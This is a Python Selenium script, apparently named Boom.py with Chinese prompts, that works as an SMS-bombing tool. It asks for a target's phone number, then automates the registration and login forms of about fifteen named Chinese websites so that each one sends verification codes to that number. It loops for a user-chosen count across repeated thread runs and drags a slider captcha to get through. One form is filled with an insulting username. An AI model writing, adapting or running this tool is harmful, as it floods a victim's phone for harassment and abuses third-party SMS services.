#!/usr/bin/env python
# coding=utf-8
'''
Author: wuxian
Date: 2020-09-22 20:13:51
LastEditTime: 2020-09-27 16:27:56
Description: 在这里描述当前文档
FilePath: /code/Boom.py
'''
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
import time
import threading




header = {
    "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
}


class Boom:
    def __init__(self):
        self.boomNumber = input("请输入要轰炸的手机号码：\n")
        print("您要轰炸的电话号码是：%s" % (self.boomNumber))
        self.driver = webdriver.Chrome()

    def click(self, types, name):
        if types == 'id':
            self.driver.find_element_by_id(name).click()
        elif types == 'class':
            self.driver.find_element_by_class_name(name).click()
        elif types == 'css':
            self.driver.find_element_by_css_selector(name).click()
        elif types == 'name':
            self.driver.find_element_by_name(name).click()
        elif types == 'xpath':
            self.driver.find_element_by_xpath(name).click()

    def send_keys(self, types, name):
        if types == 'id':
            self.driver.find_element_by_id(name).send_keys(self.boomNumber)
        elif types == 'class':
            self.driver.find_element_by_class_name(
                name).send_keys(self.boomNumber)
        elif types == 'css':
            self.driver.find_element_by_css_selector(
                name).send_keys(self.boomNumber)
        elif types == 'name':
            self.driver.find_element_by_name(name).send_keys(self.boomNumber)
        elif types == 'xpath':
            self.driver.find_element_by_xpath(name).send_keys(self.boomNumber)

    # 制作登录发送模板
    def template(self, url, pop, qiehuan, inputs, clicks):
        self.driver.get(url=url)
        if pop:
            self.click(pop["type"], pop["name"])
            time.sleep(5)
        if qiehuan:
            self.click(qiehuan["type"], qiehuan["name"])
            time.sleep(5)
        if inputs:
            self.send_keys(inputs["type"], inputs["name"])
            time.sleep(5)
        if clicks:
            self.click(clicks["type"], clicks["name"])
            time.sleep(5)





    def get_Guazi(self):
        url = "https://www.guazi.com/bj/"
        try:
            print("打开瓜子网站页面")
            pop = {
                "type": "css", "name": "body > div.layer-worth.active > a.close.js-close-finance-pop"}
            qiehuan = {"type": "id", "name": "js-login-new"}
            inputs = {"type": "name", "name": "phone"}
            clicks = {"type": "class", "name": "get-code"}
            boom.template(url=url, pop=pop, qiehuan=qiehuan,
                          inputs=inputs, clicks=clicks)
            print("瓜子发送成功")
        except:
            print("瓜子发送失败")
            pass


    def get_Lgclub(self):
        url = "https://ag9bbs.com/home/index"
        try:
            print("打开老哥俱乐部网站页面")
            pop = {"type": "xpath",
                   "name": '//*[@id="app"]/div/div/div[1]/div[1]/div/div[1]/div[1]/div/div/div[2]/div[3]/div/span[1]'}
            qiehuan = {
                "type": "xpath", "name": '//*[@id="app"]/div/div/div[1]/div[1]/div/div[1]/div[2]/div/div/div/div[2]/div/div[1]/span[2]'}
            inputs = {
                "type": "xpath", "name": '//*[@id="app"]/div/div/div[1]/div[1]/div/div[1]/div[2]/div/div/div/div[2]/div/div[2]/div/div[1]/div[1]/div/div/div[1]/input'}
            clicks = {
                "type": "xpath", "name": '//*[@id="app"]/div/div/div[1]/div[1]/div/div[1]/div[2]/div/div/div/div[2]/div/div[2]/div/div[1]/div[2]/div/div/div[1]/div[2]/div/button/span'}
            boom.template(url=url, pop=pop, qiehuan=qiehuan,
                          inputs=inputs, clicks=clicks)
            print("老哥俱乐部发送成功")
        except:
            print("老哥俱乐部发送失败")
            pass

    def get_YuyanLive(self):
        url = "https://www.yuyanlive.com/"
        try:
            print("打开雨燕直播网站页面")
            pop = {"type": "class", "name": "header-register"}
            inputs = {"type": "xpath",
                      "name": '/html/body/div[3]/div/div[1]/div[1]/input'}
            clicks = {"type": "class", "name": "verify-text"}
            boom.template(url=url, pop=pop, qiehuan=None,
                          inputs=inputs, clicks=clicks)
            print("雨燕直播发送成功")
        except:
            print("雨燕直播发送失败")
            pass

    def get_JustMi(self):
        url = "https://www.justmi.cn/"
        try:
            print("打开抓米直播网站页面")
            pop = {"type": "class", "name": "login-btn"}
            inputs = {"type": "class", "name": 'el-input__inner'}
            clicks = {"type": "class", "name": "getCode"}
            boom.template(url=url, pop=pop, qiehuan=None,
                          inputs=inputs, clicks=clicks)
            print("抓米直播发送成功")
        except:
            print("抓米直播发送失败")
            pass

    def get_HouseBao(self):
        url = "https://www.zonefang.com/member/common/register"
        try:
            print("打开众房宝网站页面")
            inputs = {"type": "class", "name": 'regPhone'}
            clicks = {"type": "class", "name": "registerCode"}
            boom.template(url=url, pop=None, qiehuan=None,
                          inputs=inputs, clicks=clicks)
            print("众房宝发送成功")
        except:
            print("众房宝发送失败")
            pass

    def get_Paidai(self):
        url = "https://account.ppdai.com/pc/login"
        try:
            print("打开拍拍贷网站页面")
            pop = {"type": "id", "name": "login_returnSms"}
            inputs = {"type": "id", "name": 'Mobile'}
            clicks = {"type": "id", "name": "btnSendSms"}
            boom.template(url=url, pop=pop, qiehuan=None,
                          inputs=inputs, clicks=clicks)
            print("拍拍贷发送成功")
        except:
            print("拍拍贷发送失败")
            pass

    def get_elm(self):
        url = "https://passport.ele.me/?#!domain=OPENAPI&type=pac&from=https%3A%2F%2Fopen.faas.ele.me%2F"
        try:
            print("打开饿了么网站页面")
            inputs = {"type": "xpath",
                      "name": '/html/body/div/div[2]/div[2]/div[1]/input'}
            clicks = {"type": "xpath",
                      "name": "/html/body/div/div[2]/div[2]/div[2]/button"}
            boom.template(url=url, pop=None, qiehuan=None,
                          inputs=inputs, clicks=clicks)
            print("饿了么发送成功")
        except:
            print("饿了么发送失败")
            pass

    def get_Xiangqin(self):
        url = "https://www.ahxiangqin.cn/index.php?c=passport&a=reg"
        try:
            print("打开安徽相亲网页面")
            inputs = {"type": "id", "name": 'mobile'}
            clicks = {"type": "xpath",
                      "name": '//*[@id="regform"]/div[2]/div/span/i'}
            boom.template(url=url, pop=None, qiehuan=None,
                          inputs=inputs, clicks=clicks)
            print("安徽相亲网发送成功")
        except:
            print("安徽相亲网发送失败")
            pass

    def get_Wozhu(self):
        url = "http://m.7799520.com/register.html"
        try:
            print("打开我主良缘页面")
            inputs = {"type": "name", "name": 'mobile'}
            clicks = {"type": "xpath",
                      "name": "/html/body/div[1]/div/form/div[3]/button"}
            boom.template(url=url, pop=None, qiehuan=None,
                          inputs=inputs, clicks=clicks)
            print("我主良缘发送成功")
        except:
            print("我主良缘发送失败")
            pass

    def get_SichuanAir(self):
        url = "https://flights.sichuanair.com/3uair/ibe/profile/createProfile.do"
        try:
            print("打开四川航空页面")
            inputs = {"type": "name", "name": 'mobilePhone'}
            clicks = {"type": "id", "name": "sendSmsCode"}
            boom.template(url=url, pop=None, qiehuan=None,
                          inputs=inputs, clicks=clicks)
            print("四川航空发送成功")
        except:
            print("四川航空发送失败")
            pass

    def get_Weipin(self):
        url = "https://passport.vip.com/login"
        try:
            print("打开唯品会页面")
            pop = {"type": "xpath", "name": '/html/body/div[2]/div/div[1]/div[1]/div/div[1]/div[2]'}
            qiehuan = {"type": "xpath", "name": '//*[@id="J_login_form"]/div[5]/div/div/div[1]/a'}
            inputs = {"type": "xpath", "name": '//*[@id="J_mobile_login_phone"]'}
            clicks = {"type": "id", "name": "J_mobile_login_sms_send"}
            boom.template(url=url, pop=pop, qiehuan=qiehuan,
                          inputs=inputs, clicks=clicks)
            print("唯品会发送成功")
        except:
            print("唯品会发送失败")
            pass

    def get_Xiangxiao(self):
        url = "https://www.xxsy.net/Reg"
        try:
            self.driver.get(url)
            print("打开湘潇书院页面")
            pop2 = self.driver.find_element_by_name("userPwd").send_keys("qwerty12306")
            pop1 = self.driver.find_element_by_name("confirmUserPwd").send_keys("qwerty12306")  
            inputs = self.driver.find_element_by_name("mobileNumber").send_keys(self.boomNumber)
            time.sleep(3)
            clicks = self.driver.find_element_by_name("getMobileCode").click()
            print("湘潇书院发送成功")
        except:
            print("湘潇书院失败")
            pass

    def get_Xueqiu(self):
        url = "https://xueqiu.com/"
        try:
            print("打开雪球页面")
            pop = {"type": "xpath", "name": '//*[@id="app"]/nav/div[1]/div[2]/div/div'}
            qiehuan = {"type": "xpath", "name": '/html/body/div[2]/div[1]/div/div/div[2]/div[1]/div[1]/div[1]/a[1]'}
            inputs = {"type": "name", "name": "telephone"}
            clicks = {"type": "xpath", "name": '/html/body/div[2]/div[1]/div/div/div[2]/div[1]/div[1]/div[2]/div/form/div[1]/span[2]/a'}
            boom.template(url=url, pop=pop, qiehuan=qiehuan,
                          inputs=inputs, clicks=clicks)
            
            print("雪球发送成功")
        except:
            print("雪球发送失败")
            pass

    def get_suning(self):
        url = "https://reg.suning.com/person.do"
        try:
            print("打开苏宁易购页面")
            pop = {"type": "class", "name": "agree-btn"}
            inputs = {"type": "id", "name": "mobileAlias"}
            boom.template(url=url, pop=pop, qiehuan=None,
                          inputs=inputs, clicks=None)
            time.sleep(5)
            canvas = self.driver.find_element_by_xpath('//*[@id="siller_dt_child_content_containor"]/div[3]')
            print("找到了")
            self.sleader(38,0,10,canvas)
            time.sleep(4)
            self.driver.find_element_by_class_name("send-msg").click()
            print("苏宁易购发送成功")
        except:
            print("苏宁易购发送失败")
            pass

        
    def get_Azhan(self):
        url = "https://www.acfun.cn/reg/"
        try:
            print("打开A站页面")
            self.driver.get(url)
            self.driver.find_element_by_id("ipt-mobile-reg").send_keys(self.boomNumber)
            self.driver.find_element_by_id("ipt-username-reg").send_keys("小狗比就是你啊")
            self.driver.find_element_by_id("ipt-agree-reg").click()
            self.driver.find_element_by_id("send-mobile-code").click()
            print("A站发送成功")
        except:
            print("A站发送失败")
            pass

    def sleader(self,xset,yset,times,drag):
        ActionChains(self.driver).click_and_hold(drag).perform()
        x=0
        while x <= int(times):
            ActionChains(self.driver).move_by_offset(xoffset=xset,yoffset=yset).perform()
            time.sleep(1)
            x+=1
        ActionChains(self.driver).release().perform()  
        

    def startboom_text(self):
        
        y = 0
        x = input("填写轰炸次数")
        while y < int(x):
            boom.get_Guazi()
            boom.get_Lgclub()
            boom.get_YuyanLive()
            boom.get_JustMi()
            boom.get_HouseBao()
            boom.get_Paidai()
            boom.get_elm()
            boom.get_Xiangqin()
            boom.get_Wozhu()
            boom.get_SichuanAir()
            boom.get_Weipin()
            boom.get_Xiangxiao()
            boom.get_Xueqiu()
            boom.get_suning()
            boom.get_Azhan()
            time.sleep(60)
            y+=1
        boom.driver.quit()




if __name__ == "__main__":
    boom = Boom()
    for i in range(10):
        t = threading.Thread(target=boom.startboom_text)
        t.start()
        t.join()
    # boom.startboom_text()
